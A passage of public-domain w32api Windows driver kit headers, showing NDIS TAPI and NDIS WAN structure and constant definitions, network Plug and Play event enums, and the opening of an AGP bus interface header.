} NDIS_TAPI_CONDITIONAL_MEDIA_DETECTION, *PNDIS_TAPI_CONDITIONAL_MEDIA_DETECTION;

typedef struct _NDIS_TAPI_DROP {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulUserUserInfoSize;
  IN UCHAR  UserUserInfo[1];
} NDIS_TAPI_DROP, *PNDIS_TAPI_DROP;

typedef struct _NDIS_TAPI_PROVIDER_SHUTDOWN {
  IN ULONG  ulRequestID;
} NDIS_TAPI_PROVIDER_SHUTDOWN, *PNDIS_TAPI_PROVIDER_SHUTDOWN;

typedef struct _NDIS_TAPI_SET_APP_SPECIFIC {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulAppSpecific;
} NDIS_TAPI_SET_APP_SPECIFIC, *PNDIS_TAPI_SET_APP_SPECIFIC;

typedef struct _NDIS_TAPI_SET_CALL_PARAMS {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulBearerMode;
  IN ULONG  ulMinRate;
  IN ULONG  ulMaxRate;
  IN BOOLEAN  bSetLineDialParams;
  IN LINE_DIAL_PARAMS  LineDialParams;
} NDIS_TAPI_SET_CALL_PARAMS, *PNDIS_TAPI_SET_CALL_PARAMS;

typedef struct _NDIS_TAPI_SET_DEFAULT_MEDIA_DETECTION {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulMediaModes;
} NDIS_TAPI_SET_DEFAULT_MEDIA_DETECTION, *PNDIS_TAPI_SET_DEFAULT_MEDIA_DETECTION;

typedef struct _NDIS_TAPI_SET_DEV_CONFIG {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN ULONG  ulDeviceClassSize;
  IN ULONG  ulDeviceClassOffset;
  IN ULONG  ulDeviceConfigSize;
  IN UCHAR  DeviceConfig[1];
} NDIS_TAPI_SET_DEV_CONFIG, *PNDIS_TAPI_SET_DEV_CONFIG;

typedef struct _NDIS_TAPI_SET_MEDIA_MODE {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulMediaMode;
} NDIS_TAPI_SET_MEDIA_MODE, *PNDIS_TAPI_SET_MEDIA_MODE;

typedef struct _NDIS_TAPI_SET_STATUS_MESSAGES {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulLineStates;
  IN ULONG  ulAddressStates;
} NDIS_TAPI_SET_STATUS_MESSAGES, *PNDIS_TAPI_SET_STATUS_MESSAGES;

typedef struct _NDIS_TAPI_ACCEPT {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulUserUserInfoSize;
  IN UCHAR  UserUserInfo[1];
} NDIS_TAPI_ACCEPT, *PNDIS_TAPI_ACCEPT;

typedef struct _NDIS_TAPI_DIAL {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulDestAddressSize;
  IN CHAR  szDestAddress[1];
} NDIS_TAPI_DIAL, *PNDIS_TAPI_DIAL;

typedef struct _NDIS_TAPI_EVENT {
  IN HTAPI_LINE  htLine;
  IN HTAPI_CALL  htCall;
  IN ULONG  ulMsg;
  IN ULONG  ulParam1;
  IN ULONG  ulParam2;
  IN ULONG  ulParam3;
} NDIS_TAPI_EVENT, *PNDIS_TAPI_EVENT;

typedef struct _NDIS_TAPI_OPEN {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN HTAPI_LINE  htLine;
  OUT HDRV_LINE  hdLine;
} NDIS_TAPI_OPEN, *PNDIS_TAPI_OPEN;

typedef struct _NDIS_TAPI_SECURE_CALL {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
} NDIS_TAPI_SECURE_CALL, *PNDIS_TAPI_SECURE_CALL;

typedef struct _NDIS_TAPI_SELECT_EXT_VERSION {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulExtVersion;
} NDIS_TAPI_SELECT_EXT_VERSION, *PNDIS_TAPI_SELECT_EXT_VERSION;

typedef struct _NDIS_TAPI_SEND_USER_USER_INFO {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulUserUserInfoSize;
  IN UCHAR  UserUserInfo[1];
} NDIS_TAPI_SEND_USER_USER_INFO, *PNDIS_TAPI_SEND_USER_USER_INFO;


typedef struct _NDIS_TAPI_CONFIG_DIALOG {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN ULONG  ulDeviceClassSize;
  IN ULONG  ulDeviceClassOffset;
  IN ULONG  ulLibraryNameTotalSize;
  OUT ULONG ulLibraryNameNeededSize;
  OUT CHAR  szLibraryName[1];
} NDIS_TAPI_CONFIG_DIALOG, *PNDIS_TAPI_CONFIG_DIALOG;

typedef struct _NDIS_TAPI_DEV_SPECIFIC {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulAddressID;
  IN HDRV_CALL  hdCall;
  IN OUT ULONG  ulParamsSize;
  IN OUT UCHAR  Params[1];
} NDIS_TAPI_DEV_SPECIFIC, *PNDIS_TAPI_DEV_SPECIFIC;

typedef struct _NDIS_TAPI_GET_ADDRESS_CAPS {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN ULONG  ulAddressID;
  IN ULONG  ulExtVersion;
  OUT LINE_ADDRESS_CAPS  LineAddressCaps;
} NDIS_TAPI_GET_ADDRESS_CAPS, *PNDIS_TAPI_GET_ADDRESS_CAPS;

typedef struct _NDIS_TAPI_GET_ADDRESS_ID {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  OUT ULONG  ulAddressID;
  IN ULONG  ulAddressMode;
  IN ULONG  ulAddressSize;
  IN CHAR  szAddress[1];
} NDIS_TAPI_GET_ADDRESS_ID, *PNDIS_TAPI_GET_ADDRESS_ID;

typedef struct _NDIS_TAPI_GET_ADDRESS_STATUS {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulAddressID;
  OUT LINE_ADDRESS_STATUS  LineAddressStatus;
} NDIS_TAPI_GET_ADDRESS_STATUS, *PNDIS_TAPI_GET_ADDRESS_STATUS;

typedef struct _NDIS_TAPI_GET_CALL_ADDRESS_ID {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  OUT ULONG  ulAddressID;
} NDIS_TAPI_GET_CALL_ADDRESS_ID, *PNDIS_TAPI_GET_CALL_ADDRESS_ID;

typedef struct _NDIS_TAPI_GET_CALL_INFO {
  ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  OUT LINE_CALL_INFO  LineCallInfo;
} NDIS_TAPI_GET_CALL_INFO, *PNDIS_TAPI_GET_CALL_INFO;

typedef struct _NDIS_TAPI_GET_CALL_STATUS {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  OUT LINE_CALL_STATUS  LineCallStatus;
} NDIS_TAPI_GET_CALL_STATUS, *PNDIS_TAPI_GET_CALL_STATUS;

typedef struct _NDIS_TAPI_GET_DEV_CAPS {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN ULONG  ulExtVersion;
  OUT LINE_DEV_CAPS  LineDevCaps;
} NDIS_TAPI_GET_DEV_CAPS, *PNDIS_TAPI_GET_DEV_CAPS;

typedef struct _NDIS_TAPI_GET_DEV_CONFIG {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN ULONG  ulDeviceClassSize;
  IN ULONG  ulDeviceClassOffset;
  OUT VAR_STRING  DeviceConfig;
} NDIS_TAPI_GET_DEV_CONFIG, *PNDIS_TAPI_GET_DEV_CONFIG;

typedef struct _NDIS_TAPI_GET_EXTENSION_ID {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  OUT LINE_EXTENSION_ID  LineExtensionID;
} NDIS_TAPI_GET_EXTENSION_ID, *PNDIS_TAPI_GET_EXTENSION_ID;

typedef struct _NDIS_TAPI_GET_ID {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulAddressID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulSelect;
  IN ULONG  ulDeviceClassSize;
  IN ULONG  ulDeviceClassOffset;
  OUT VAR_STRING  DeviceID;
} NDIS_TAPI_GET_ID, *PNDIS_TAPI_GET_ID;

typedef struct _NDIS_TAPI_GET_LINE_DEV_STATUS {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  OUT LINE_DEV_STATUS  LineDevStatus;
} NDIS_TAPI_GET_LINE_DEV_STATUS, *PNDIS_TAPI_GET_LINE_DEV_STATUS;

typedef struct _NDIS_TAPI_MAKE_CALL {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN HTAPI_CALL  htCall;
  OUT HDRV_CALL  hdCall;
  IN ULONG  ulDestAddressSize;
  IN ULONG  ulDestAddressOffset;
  IN BOOLEAN  bUseDefaultLineCallParams;
  IN LINE_CALL_PARAMS  LineCallParams;
} NDIS_TAPI_MAKE_CALL, *PNDIS_TAPI_MAKE_CALL;

typedef struct _NDIS_TAPI_NEGOTIATE_EXT_VERSION {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceID;
  IN ULONG  ulLowVersion;
  IN ULONG  ulHighVersion;
  OUT ULONG  ulExtVersion;
} NDIS_TAPI_NEGOTIATE_EXT_VERSION, *PNDIS_TAPI_NEGOTIATE_EXT_VERSION;

typedef struct _NDIS_TAPI_PROVIDER_INITIALIZE {
  IN ULONG  ulRequestID;
  IN ULONG  ulDeviceIDBase;
  OUT ULONG  ulNumLineDevs;
  OUT ULONG  ulProviderID;
} NDIS_TAPI_PROVIDER_INITIALIZE, *PNDIS_TAPI_PROVIDER_INITIALIZE;


#define CO_TAPI_VERSION                   NDIS_TAPI_CURRENT_VERSION

#define CO_TAPI_FLAG_OUTGOING_CALL          0x00000001
#define CO_TAPI_FLAG_INCOMING_CALL          0x00000002
#define CO_TAPI_FLAG_USE_DEFAULT_CALLPARAMS	0x00000004

#define AF_TAPI_SAP_TYPE                  0x00008000

typedef struct _CO_TAPI_ADDRESS_CAPS {
  IN ULONG  ulLineID;
  IN ULONG  ulAddressID;
  OUT ULONG  ulFlags;
  OUT LINE_ADDRESS_CAPS  LineAddressCaps;
} CO_TAPI_ADDRESS_CAPS, *PCO_TAPI_ADDRESS_CAPS;

/* CO_TAPI_CM_CAPS.ulFlags constants */
#define CO_TAPI_FLAG_PER_LINE_CAPS        0x00000001

typedef struct _CO_TAPI_CM_CAPS {
  OUT ULONG  ulCoTapiVersion;
  OUT ULONG  ulNumLines;
  OUT ULONG  ulFlags;
} CO_TAPI_CM_CAPS, *PCO_TAPI_CM_CAPS;

typedef struct _CO_TAPI_CALL_DIAGNOSTICS {
  OUT ULONG  ulOrigin;
  OUT ULONG  ulReason;
  OUT NDIS_VAR_DATA_DESC  DiagInfo;
} CO_TAPI_CALL_DIAGNOSTICS, *PCO_TAPI_CALL_DIAGNOSTICS;


/* CO_TAPI_LINE_CAPS.ulFlags constants */
#define CO_TAPI_FLAG_PER_ADDRESS_CAPS     0x00000001

typedef struct _CO_TAPI_LINE_CAPS {
  IN ULONG  ulLineID;
  OUT ULONG  ulFlags;
  OUT LINE_DEV_CAPS  LineDevCaps;
} CO_TAPI_LINE_CAPS, *PCO_TAPI_LINE_CAPS;

typedef struct _CO_TAPI_TRANSLATE_NDIS_CALLPARAMS {
  IN ULONG  ulFlags;
  IN NDIS_VAR_DATA_DESC  NdisCallParams;
  OUT NDIS_VAR_DATA_DESC  LineCallInfo;
} CO_TAPI_TRANSLATE_NDIS_CALLPARAMS, *PCO_TAPI_TRANSLATE_NDIS_CALLPARAMS;

typedef struct _CO_TAPI_TRANSLATE_TAPI_CALLPARAMS {
  IN ULONG  ulLineID;
  IN ULONG  ulAddressID;
  IN ULONG  ulFlags;
  IN NDIS_VAR_DATA_DESC  DestAddress;
  IN NDIS_VAR_DATA_DESC  LineCallParams;
  OUT NDIS_VAR_DATA_DESC  NdisCallParams;
} CO_TAPI_TRANSLATE_TAPI_CALLPARAMS, *PCO_TAPI_TRANSLATE_TAPI_CALLPARAMS;

/* CO_TAPI_TRANSLATE_SAP.ulLineID constants */
#define CO_TAPI_LINE_ID_UNSPECIFIED       0xFFFFFFFF

/* CO_TAPI_TRANSLATE_SAP.ulAddressID constants */
#define CO_TAPI_ADDRESS_ID_UNSPECIFIED    0xFFFFFFFF

typedef struct _CO_TAPI_TRANSLATE_SAP {
  IN ULONG  ulLineID;
  IN ULONG  ulAddressID;
  IN ULONG  ulMediaModes;
  IN ULONG  Reserved;
  OUT ULONG  NumberOfSaps;
  OUT NDIS_VAR_DATA_DESC  NdisSapParams[1];
} CO_AF_TAPI_SAP, *PCO_AF_TAPI_SAP;

typedef struct _CO_AF_TAPI_INCOMING_CALL_PARAMETERS {
  IN  ULONG  ulLineID;
  IN  ULONG  ulAddressID;
  IN  ULONG  ulFlags;
  IN  NDIS_VAR_DATA_DESC  LineCallInfo;
} CO_AF_TAPI_INCOMING_CALL_PARAMETERS, *PCO_AF_TAPI_INCOMING_CALL_PARAMETERS;

typedef struct _CO_AF_TAPI_MAKE_CALL_PARAMETERS {
  IN  ULONG  ulLineID;
  IN  ULONG  ulAddressID;
  IN  ULONG  ulFlags;
  IN  NDIS_VAR_DATA_DESC  DestAddress;
  IN  NDIS_VAR_DATA_DESC  LineCallParams;
} CO_AF_TAPI_MAKE_CALL_PARAMETERS, *PCO_AF_TAPI_MAKE_CALL_PARAMETERS;

#ifdef __cplusplus
}
#endif

#endif /* _NDIS_TAPI_ */


```

`include/ddk/ndiswan.h`:

```h
/*
 * ndiswan.h
 *
 * Definitions for NDIS WAN miniport drivers
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#ifndef _NDIS_WAN_
#define _NDIS_WAN_

#ifdef __cplusplus
extern "C" {
#endif

#define NDIS_USE_WAN_WRAPPER            0x00000001

#define NDIS_STATUS_TAPI_INDICATION     ((NDIS_STATUS)0x40010080L)

/* NDIS_WAN_INFO.FramingBits constants */
#define RAS_FRAMING                     0x00000001
#define RAS_COMPRESSION                 0x00000002

#define ARAP_V1_FRAMING                 0x00000004
#define ARAP_V2_FRAMING                 0x00000008
#define ARAP_FRAMING                    (ARAP_V1_FRAMING | ARAP_V2_FRAMING)

#define PPP_MULTILINK_FRAMING           0x00000010
#define PPP_SHORT_SEQUENCE_HDR_FORMAT   0x00000020
#define PPP_MC_MULTILINK_FRAMING        0x00000040

#define PPP_FRAMING                     0x00000100
#define PPP_COMPRESS_ADDRESS_CONTROL    0x00000200
#define PPP_COMPRESS_PROTOCOL_FIELD     0x00000400
#define PPP_ACCM_SUPPORTED              0x00000800

#define SLIP_FRAMING                    0x00001000
#define SLIP_VJ_COMPRESSION             0x00002000
#define SLIP_VJ_AUTODETECT              0x00004000

#define MEDIA_NRZ_ENCODING              0x00010000
#define MEDIA_NRZI_ENCODING             0x00020000
#define MEDIA_NLPID                     0x00040000

#define RFC_1356_FRAMING                0x00100000
#define RFC_1483_FRAMING                0x00200000
#define RFC_1490_FRAMING                0x00400000
#define LLC_ENCAPSULATION               0x00800000

#define SHIVA_FRAMING                   0x01000000
#define NBF_PRESERVE_MAC_ADDRESS        0x01000000

#define PASS_THROUGH_MODE               0x10000000
#define RAW_PASS_THROUGH_MODE           0x20000000

#define TAPI_PROVIDER                   0x80000000

#define BRIDGING_FLAG_LANFCS            0x00000001
#define BRIDGING_FLAG_LANID             0x00000002
#define BRIDGING_FLAG_PADDING           0x00000004

#define BRIDGING_TINYGRAM               0x00000001
#define BRIDGING_LANID                  0x00000002
#define BRIDGING_NO_SPANNING_TREE       0x00000004
#define BRIDGING_8021D_SPANNING_TREE    0x00000008
#define BRIDGING_8021G_SPANNING_TREE    0x00000010
#define BRIDGING_SOURCE_ROUTING         0x00000020
#define BRIDGING_DEC_LANBRIDGE          0x00000040

#define BRIDGING_TYPE_RESERVED          0x00000001
#define BRIDGING_TYPE_8023_CANON        0x00000002
#define BRIDGING_TYPE_8024_NO_CANON     0x00000004
#define BRIDGING_TYPE_8025_NO_CANON     0x00000008
#define BRIDGING_TYPE_FDDI_NO_CANON     0x00000010
#define BRIDGING_TYPE_8024_CANON        0x00000400
#define BRIDGING_TYPE_8025_CANON        0x00000800
#define BRIDGING_TYPE_FDDI_CANON        0x00001000

/* NDIS_WAN_COMPRESS_INFO.MSCompType constants */
#define NDISWAN_COMPRESSION             0x00000001
#define NDISWAN_ENCRYPTION              0x00000010
#define NDISWAN_40_ENCRYPTION           0x00000020
#define NDISWAN_128_ENCRYPTION          0x00000040
#define NDISWAN_56_ENCRYPTION           0x00000080
#define NDISWAN_HISTORY_LESS            0x01000000

/* NDIS_WAN_COMPRESS_INFO.CompType constants */
#define COMPTYPE_OUI                    0
#define COMPTYPE_NT31RAS                254
#define COMPTYPE_NONE                   255

#define WAN_ERROR_CRC                   ((ULONG)0x00000001)
#define WAN_ERROR_FRAMING               ((ULONG)0x00000002)
#define WAN_ERROR_HARDWAREOVERRUN       ((ULONG)0x00000004)
#define WAN_ERROR_BUFFEROVERRUN         ((ULONG)0x00000008)
#define WAN_ERROR_TIMEOUT               ((ULONG)0x00000010)
#define WAN_ERROR_ALIGNMENT             ((ULONG)0x00000020)

#define NdisMWanInitializeWrapper(NdisWrapperHandle, \
                                  SystemSpecific1,   \
                                  SystemSpecific2,   \
                                  SystemSpecific3)   \
{                                                     \
  NdisMInitializeWrapper(NdisWrapperHandle,           \
                         SystemSpecific1,             \
                         SystemSpecific2,             \
                         SystemSpecific3);            \
}

typedef struct _NDIS_WAN_INFO {
  OUT ULONG MaxFrameSize;
  OUT ULONG MaxTransmit;
  OUT ULONG HeaderPadding;
  OUT ULONG TailPadding;
  OUT ULONG Endpoints;
  OUT UINT MemoryFlags;
  OUT NDIS_PHYSICAL_ADDRESS HighestAcceptableAddress;
  OUT ULONG FramingBits;
  OUT ULONG DesiredACCM;
} NDIS_WAN_INFO, *PNDIS_WAN_INFO;

typedef struct _NDIS_WAN_GET_LINK_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  IN ULONG MaxSendFrameSize;
  OUT ULONG MaxRecvFrameSize;
  OUT ULONG HeaderPadding;
  OUT ULONG TailPadding;
  OUT ULONG SendFramingBits;
  OUT ULONG RecvFramingBits;
  OUT ULONG SendCompressionBits;
  OUT ULONG RecvCompressionBits;
  OUT ULONG SendACCM;
  OUT ULONG RecvACCM;
} NDIS_WAN_GET_LINK_INFO, *PNDIS_WAN_GET_LINK_INFO;

typedef struct _NDIS_WAN_SET_LINK_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  IN ULONG MaxSendFrameSize;
  IN ULONG MaxRecvFrameSize;
  IN ULONG HeaderPadding;
  IN ULONG TailPadding;
  IN ULONG SendFramingBits;
  IN ULONG RecvFramingBits;
  IN ULONG SendCompressionBits;
  IN ULONG RecvCompressionBits;
  IN ULONG SendACCM;
  IN ULONG RecvACCM;
} NDIS_WAN_SET_LINK_INFO, *PNDIS_WAN_SET_LINK_INFO;

typedef struct _NDIS_WAN_GET_BRIDGE_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  OUT USHORT LanSegmentNumber;
  OUT UCHAR BridgeNumber;
  OUT UCHAR BridgingOptions;
  OUT ULONG BridgingCapabilities;
  OUT UCHAR BridgingType;
  OUT UCHAR MacBytes[6];
} NDIS_WAN_GET_BRIDGE_INFO, *PNDIS_WAN_GET_BRIDGE_INFO;

typedef struct _NDIS_WAN_SET_BRIDGE_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  IN USHORT LanSegmentNumber;
  IN UCHAR BridgeNumber;
  IN UCHAR BridgingOptions;
  IN ULONG BridgingCapabilities;
  IN UCHAR BridgingType;
  IN UCHAR MacBytes[6];
} NDIS_WAN_SET_BRIDGE_INFO, *PNDIS_WAN_SET_BRIDGE_INFO;

typedef struct _NDIS_WAN_COMPRESS_INFO {
  UCHAR SessionKey[8];
  ULONG MSCompType;
  UCHAR CompType;
  USHORT CompLength;
  _ANONYMOUS_UNION union {
    struct {
      UCHAR CompOUI[3];
      UCHAR CompSubType;
      UCHAR CompValues[32];
    } Proprietary;
    struct {
      UCHAR CompValues[32];
    } Public;
  } DUMMYUNIONNAME;
} NDIS_WAN_COMPRESS_INFO, *PNDIS_WAN_COMPRESS_INFO;

typedef struct _NDIS_WAN_GET_COMP_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  OUT NDIS_WAN_COMPRESS_INFO SendCapabilities;
  OUT NDIS_WAN_COMPRESS_INFO RecvCapabilities;
} NDIS_WAN_GET_COMP_INFO, *PNDIS_WAN_GET_COMP_INFO;

typedef struct _NDIS_WAN_SET_COMP_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  IN NDIS_WAN_COMPRESS_INFO SendCapabilities;
  IN NDIS_WAN_COMPRESS_INFO RecvCapabilities;
} NDIS_WAN_SET_COMP_INFO, *PNDIS_WAN_SET_COMP_INFO;

typedef struct _NDIS_WAN_GET_STATS_INFO {
  IN NDIS_HANDLE NdisLinkHandle;
  OUT ULONG BytesSent;
  OUT ULONG BytesRcvd;
  OUT ULONG FramesSent;
  OUT ULONG FramesRcvd;
  OUT ULONG CRCErrors;
  OUT ULONG TimeoutErrors;
  OUT ULONG AlignmentErrors;
  OUT ULONG SerialOverrunErrors;
  OUT ULONG FramingErrors;
  OUT ULONG BufferOverrunErrors;
  OUT ULONG BytesTransmittedUncompressed;
  OUT ULONG BytesReceivedUncompressed;
  OUT ULONG BytesTransmittedCompressed;
  OUT ULONG BytesReceivedCompressed;
  OUT ULONG TunnelPacketsRecieved;
  OUT ULONG TunnelRecievePacketsPending;
  OUT ULONG TunnelPacketsIndicatedUp;
  OUT ULONG TunnelRecievePacketsRejected;
  OUT ULONG TunnelPacketsSent;
  OUT ULONG TunnelPacketsSentComplete;
  OUT ULONG TunnelTransmitPacketsPending;
  OUT ULONG TunnelPacketsTransmitError;
  OUT ULONG TunnelPacketsSentError;
  OUT ULONG TunnelTransmitPacketsRejected;
  OUT ULONG TunnelAcksSent;
  OUT ULONG TunnelAcksSentComplete;
  OUT ULONG TunnelGeneric1;
  OUT ULONG TunnelGeneric2;
  OUT ULONG TunnelGeneric3;
} NDIS_WAN_GET_STATS_INFO, *PNDIS_WAN_GET_STATS_INFO;

typedef struct _NDIS_MAC_LINE_UP {
  IN ULONG LinkSpeed;
  IN NDIS_WAN_QUALITY Quality;
  IN USHORT SendWindow;
  IN NDIS_HANDLE ConnectionWrapperID;
  IN NDIS_HANDLE NdisLinkHandle;
  OUT NDIS_HANDLE NdisLinkContext;
} NDIS_MAC_LINE_UP, *PNDIS_MAC_LINE_UP;

typedef struct _NDIS_MAC_LINE_DOWN {
  IN NDIS_HANDLE NdisLinkContext;
} NDIS_MAC_LINE_DOWN, *PNDIS_MAC_LINE_DOWN;

typedef struct _NDIS_MAC_FRAGMENT {
  IN NDIS_HANDLE NdisLinkContext;
  IN ULONG Errors;
} NDIS_MAC_FRAGMENT, *PNDIS_MAC_FRAGMENT;

typedef struct _NDIS_WAN_CO_INFO {
  OUT ULONG MaxFrameSize;
  OUT ULONG MaxSendWindow;
  OUT ULONG FramingBits;
  OUT ULONG DesiredACCM;
} NDIS_WAN_CO_INFO, *PNDIS_WAN_CO_INFO;

typedef struct _NDIS_WAN_CO_GET_LINK_INFO {
  OUT ULONG MaxSendFrameSize;
  OUT ULONG MaxRecvFrameSize;
  OUT ULONG SendFramingBits;
  OUT ULONG RecvFramingBits;
  OUT ULONG SendCompressionBits;
  OUT ULONG RecvCompressionBits;
  OUT ULONG SendACCM;
  OUT ULONG RecvACCM;
} NDIS_WAN_CO_GET_LINK_INFO, *PNDIS_WAN_CO_GET_LINK_INFO;

typedef struct _NDIS_WAN_CO_SET_LINK_INFO {
  IN ULONG MaxSendFrameSize;
  IN ULONG MaxRecvFrameSize;
  IN ULONG SendFramingBits;
  IN ULONG RecvFramingBits;
  IN ULONG SendCompressionBits;
  IN ULONG RecvCompressionBits;
  IN ULONG SendACCM;
  IN ULONG RecvACCM;
} NDIS_WAN_CO_SET_LINK_INFO, *PNDIS_WAN_CO_SET_LINK_INFO;

typedef struct _NDIS_WAN_CO_GET_COMP_INFO {
  OUT NDIS_WAN_COMPRESS_INFO SendCapabilities;
  OUT NDIS_WAN_COMPRESS_INFO RecvCapabilities;
} NDIS_WAN_CO_GET_COMP_INFO, *PNDIS_WAN_CO_GET_COMP_INFO;

typedef struct _NDIS_WAN_CO_SET_COMP_INFO {
  IN NDIS_WAN_COMPRESS_INFO SendCapabilities;
  IN NDIS_WAN_COMPRESS_INFO RecvCapabilities;
} NDIS_WAN_CO_SET_COMP_INFO, *PNDIS_WAN_CO_SET_COMP_INFO;

typedef struct _NDIS_WAN_CO_GET_STATS_INFO {
  OUT ULONG BytesSent;
  OUT ULONG BytesRcvd;
  OUT ULONG FramesSent;
  OUT ULONG FramesRcvd;
  OUT ULONG CRCErrors;
  OUT ULONG TimeoutErrors;
  OUT ULONG AlignmentErrors;
  OUT ULONG SerialOverrunErrors;
  OUT ULONG FramingErrors;
  OUT ULONG BufferOverrunErrors;
  OUT ULONG BytesTransmittedUncompressed;
  OUT ULONG BytesReceivedUncompressed;
  OUT ULONG BytesTransmittedCompressed;
  OUT ULONG BytesReceivedCompressed;
  OUT ULONG TunnelPacketsRecieved;
  OUT ULONG TunnelRecievePacketsPending;
  OUT ULONG TunnelPacketsIndicatedUp;
  OUT ULONG TunnelRecievePacketsRejected;
  OUT ULONG TunnelPacketsSent;
  OUT ULONG TunnelPacketsSentComplete;
  OUT ULONG TunnelTransmitPacketsPending;
  OUT ULONG TunnelPacketsTransmitError;
  OUT ULONG TunnelPacketsSentError;
  OUT ULONG TunnelTransmitPacketsRejected;
  OUT ULONG TunnelAcksSent;
  OUT ULONG TunnelAcksSentComplete;
  OUT ULONG TunnelGeneric1;
  OUT ULONG TunnelGeneric2;
  OUT ULONG TunnelGeneric3;
} NDIS_WAN_CO_GET_STATS_INFO, *PNDIS_WAN_CO_GET_STATS_INFO;

typedef struct _NDIS_WAN_CO_FRAGMENT {
  IN ULONG Errors;
} NDIS_WAN_CO_FRAGMENT, *PNDIS_WAN_CO_FRAGMENT;

typedef struct _WAN_CO_LINKPARAMS {
  ULONG TransmitSpeed;
  ULONG ReceiveSpeed;
  ULONG SendWindow;
} WAN_CO_LINKPARAMS, *PWAN_CO_LINKPARAMS;

typedef struct _WAN_CO_MTULINKPARAMS {
  ULONG Version;
  ULONG TransmitSpeed;
  ULONG ReceiveSpeed;
  ULONG SendWindow;
  ULONG MTU;
} WAN_CO_MTULINKPARAMS, *PWAN_CO_MTULINKPARAMS;

#ifdef __cplusplus
}
#endif

#endif /* _NDIS_WAN_ */


```

`include/ddk/netpnp.h`:

```h
#pragma once

#define __NET_PNP__

typedef enum _NET_DEVICE_POWER_STATE {
  NetDeviceStateUnspecified = 0,
  NetDeviceStateD0,
  NetDeviceStateD1,
  NetDeviceStateD2,
  NetDeviceStateD3,
  NetDeviceStateMaximum
} NET_DEVICE_POWER_STATE, *PNET_DEVICE_POWER_STATE;

typedef enum _NET_PNP_EVENT_CODE {
  NetEventSetPower,
  NetEventQueryPower,
  NetEventQueryRemoveDevice,
  NetEventCancelRemoveDevice,
  NetEventReconfigure,
  NetEventBindList,
  NetEventBindsComplete,
  NetEventPnPCapabilities,
  NetEventPause,
  NetEventRestart,
  NetEventPortActivation,
  NetEventPortDeactivation,
  NetEventIMReEnableDevice,
  NetEventMaximum
} NET_PNP_EVENT_CODE, *PNET_PNP_EVENT_CODE;

typedef struct _NET_PNP_EVENT {
  NET_PNP_EVENT_CODE NetEvent;
  PVOID Buffer;
  ULONG BufferLength;
  ULONG_PTR NdisReserved[4];
  ULONG_PTR TransportReserved[4];
  ULONG_PTR TdiReserved[4];
  ULONG_PTR TdiClientReserved[4];
} NET_PNP_EVENT, *PNET_PNP_EVENT;

/* FIXME : This belongs to ndis.h */
typedef enum _NDIS_DEVICE_PNP_EVENT {
  NdisDevicePnPEventSurpriseRemoved,
  NdisDevicePnPEventPowerProfileChanged,
  NdisDevicePnPEventMaximum
} NDIS_DEVICE_PNP_EVENT, *PNDIS_DEVICE_PNP_EVENT;

```

`include/ddk/ntagp.h`:

```h
/*
 * ntagp.h
 *
 * NT AGP bus driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Gregor Anich <blight@blight.eu.org>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#ifdef __cplusplus
extern "C" {
#endif

DEFINE_GUID(GUID_AGP_BUS_INTERFACE_STANDARD, 0x2ef74803, 0xd8d3, 0x11d1, 0x9c, 0xaa, 0x00, 0xc0, 0xf0, 0x16, 0x56, 0x36);

